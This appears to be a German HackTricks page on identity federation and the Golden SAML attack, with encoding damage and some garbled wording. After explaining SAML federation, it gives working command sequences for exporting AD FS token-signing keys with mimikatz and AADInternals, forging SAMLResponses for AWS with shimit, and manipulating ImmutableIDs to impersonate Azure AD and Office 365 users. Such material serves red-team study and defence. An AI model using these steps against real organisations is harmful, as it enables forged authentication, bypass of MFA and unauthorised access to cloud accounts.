# F√∂deration

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

[Aus den Dokumenten:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**F√∂deration** ist eine Sammlung von **Dom√§nen**, die **Vertrauen** aufgebaut haben. Das Vertrauensniveau kann variieren, umfasst jedoch in der Regel **Authentifizierung** und beinhaltet fast immer **Autorisierung**. Eine typische F√∂deration k√∂nnte eine **Anzahl von Organisationen** umfassen, die **Vertrauen** f√ºr **gemeinsamen Zugriff** auf eine Reihe von Ressourcen aufgebaut haben.

Sie k√∂nnen Ihre lokale Umgebung **mit Azure AD f√∂derieren** und diese F√∂deration f√ºr die Authentifizierung und Autorisierung verwenden. Diese Anmeldeoption stellt sicher, dass alle Benutzer **die Authentifizierung lokal** durchf√ºhren. Auf diese Weise k√∂nnen Administratoren strengere Zugriffssteuerungsrichtlinien implementieren. Die F√∂deration mit **AD FS** und PingFederate ist verf√ºgbar.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

Grunds√§tzlich erfolgt in der F√∂deration die gesamte **Authentifizierung** in der **lokalen** Umgebung, und der Benutzer erlebt SSO in allen vertrauensw√ºrdigen Umgebungen. Benutzer k√∂nnen daher auf **Cloud**-Anwendungen zugreifen, indem sie ihre **lokalen Anmeldeinformationen** verwenden.

F√ºr den **Austausch** aller Authentifizierungs- und Autorisierungs**informationen** zwischen den Anbietern wird das **Security Assertion Markup Language (SAML)** verwendet.

In jedem F√∂derations-Setup gibt es drei Parteien:

* Benutzer oder Client
* Identit√§tsanbieter (IdP)
* Dienstanbieter (SP)

(Bilder von https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Zun√§chst greift ein Benutzer auf eine Anwendung (Dienstanbieter oder SP, wie z.B. AWS-Konsole oder vSphere-Webclient) zu. Dieser Schritt kann umgangen werden, indem der Client je nach spezifischer Implementierung direkt zum IdP (Identit√§tsanbieter) geleitet wird.
2. Anschlie√üend identifiziert der SP den geeigneten IdP (z. B. AD FS, Okta) zur Benutzerauthentifizierung. Er erstellt dann eine SAML (Security Assertion Markup Language) AuthnRequest und leitet den Client zum ausgew√§hlten IdP um.
3. Der IdP √ºbernimmt die Authentifizierung des Benutzers. Nach der Authentifizierung wird ein SAMLResponse vom IdP formuliert und √ºber den Benutzer an den SP weitergeleitet.
4. Schlie√ülich bewertet der SP die SAMLResponse. Bei erfolgreicher Validierung, was auf eine Vertrauensbeziehung zum IdP hinweist, erh√§lt der Benutzer Zugriff. Dies markiert den Abschluss des Anmeldevorgangs und erm√∂glicht es dem Benutzer, den Dienst zu nutzen.

**Wenn Sie mehr √ºber SAML-Authentifizierung und h√§ufige Angriffe erfahren m√∂chten, gehen Sie zu:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS ist ein claims-basiertes Identit√§tsmodell.
* "..claimsaresimplystatements(forexample,name,identity,group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet."
* Anspr√ºche f√ºr einen Benutzer werden in den SAML-Token geschrieben und dann vom IdP signiert, um Vertraulichkeit zu gew√§hrleisten.
* Ein Benutzer wird durch ImmutableID identifiziert. Es ist global eindeutig und in Azure AD gespeichert.
* TheImmuatbleIDisstoredon-premasms-DS-ConsistencyGuidforthe Benutzer und/oder kann aus der GUID des Benutzers abgeleitet werden.
* Weitere Informationen unter [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML-Angriff:**

* Bei ADFS wird die SAML-Antwort von einem Token-Signaturzertifikat signiert.
* Wenn das Zertifikat kompromittiert ist, ist es m√∂glich, sich als BELIEBIGER Benutzer, der mit Azure AD synchronisiert ist, bei Azure AD anzumelden!
* Genau wie bei unserem PTA-Missbrauch hat die √Ñnderung des Passworts f√ºr einen Benutzer oder MFA keine Auswirkungen, da wir die Authentifizierungsantwort f√§lschen.
* Das Zertifikat kann vom AD FS-Server mit DA-Berechtigungen extrahiert und dann von einem beliebigen mit dem Internet verbundenen Ger√§t verwendet werden.
* Weitere Informationen unter [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Der Prozess, bei dem ein **Identit√§tsanbieter (IdP)** eine **SAMLResponse** zur Autorisierung der Benutzeranmeldung erstellt, ist entscheidend. Abh√§ngig von der spezifischen Implementierung des IdP kann die **Antwort** mit dem **privaten Schl√ºssel des IdP** **signiert** oder **verschl√ºsselt** sein. Dieses Verfahren erm√∂glicht es dem **Dienstanbieter (SP)**, die Echtheit der SAMLResponse zu best√§tigen und sicherzustellen, dass sie tats√§chlich von einem vertrauensw√ºrdigen IdP ausgestellt wurde.

Ein Vergleich kann mit dem [Golden Ticket-Angriff](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) gezogen werden, bei dem der Schl√ºssel zur Authentifizierung der Benutzeridentit√§t und Berechtigungen (KRBTGT f√ºr Golden Tickets, privater Schl√ºssel f√ºr das Token-Signieren f√ºr Golden SAML) manipuliert werden kann, um ein Authentifizierungsobjekt (TGT oder SAMLResponse) zu f√§lschen. Dies erm√∂glicht die √úbernahme der Identit√§t eines beliebigen Benutzers und gew√§hrt unbefugten Zugriff auf den SP.

Golden SAMLs bieten bestimmte Vorteile:

* Sie k√∂nnen **remote erstellt** werden, ohne Teil der Dom√§ne oder F√∂deration zu sein.
* Sie bleiben auch bei aktivierter **Zwei-Faktor-Authentifizierung (2FA)** wirksam.
* Der **private Schl√ºssel zum Signieren von Token wird nicht automatisch erneuert**.
* **Das √Ñndern des Benutzerpassworts macht** einen bereits generierten SAML **nicht ung√ºltig**.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) ist ein Microsoft-Dienst, der den **sicheren Austausch von Identit√§tsinformationen** zwischen vertrauensw√ºrdigen Gesch√§ftspartnern (F√∂deration) erleichtert. Es erm√∂glicht im Wesentlichen einem Dom√§nendienst, Benutzeridentit√§ten mit anderen Dienstanbietern innerhalb einer F√∂deration zu teilen.

Indem AWS der kompromittierten Dom√§ne vertraut (in einer F√∂deration), kann diese Schwachstelle ausgenutzt werden, um potenziell **beliebige Berechtigungen in der AWS-Umgebung zu erlangen**. Der Angriff erfordert den **privaten Schl√ºssel, der zum Signieren der SAML-Objekte verwendet wird**, √§hnlich wie beim ben√∂tigten KRBTGT bei einem Golden Ticket-Angriff. Der Zugriff auf das AD FS-Benutzerkonto reicht aus, um diesen privaten Schl√ºssel zu erhalten.

Die Anforderungen f√ºr die Durchf√ºhrung eines Golden SAML-Angriffs umfassen:

* **Privater Schl√ºssel zum Signieren von Token**
* **√ñffentliches Zertifikat des IdP**
* **IdP-Name**
* **Rollenname (zu √ºbernehmende Rolle)**
* Dom√§ne\Benutzername
* Rollensitzungsname in AWS
* Amazon-Konto-ID

**Nur die fett gedruckten Elemente sind obligatorisch. Die anderen k√∂nnen nach Belieben ausgef√ºllt werden.**

Um den **privaten Schl√ºssel** zu erhalten, ist der Zugriff auf das **AD FS-Benutzerkonto** erforderlich. Von dort aus kann der private Schl√ºssel mit Tools wie [mimikatz](https://github.com/gentilkiwi/mimikatz) aus dem pers√∂nlichen Speicher exportiert werden. Um die anderen erforderlichen Informationen zu sammeln, k√∂nnen Sie das Microsoft.Adfs.Powershell-Snapin wie folgt verwenden, um sicherzustellen, dass Sie als der ADFS-Benutzer angemeldet sind:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Mit all diesen Informationen ist es m√∂glich, eine g√ºltige SAMLResponse als Benutzer, den Sie mit [**shimit**](https://github.com/cyberark/shimit) impersonieren m√∂chten, zu vergessen:
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> Cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Es ist auch m√∂glich, die ImmutableID von nur Cloud-Benutzern zu erstellen und sich als sie auszugeben.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referenzen

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
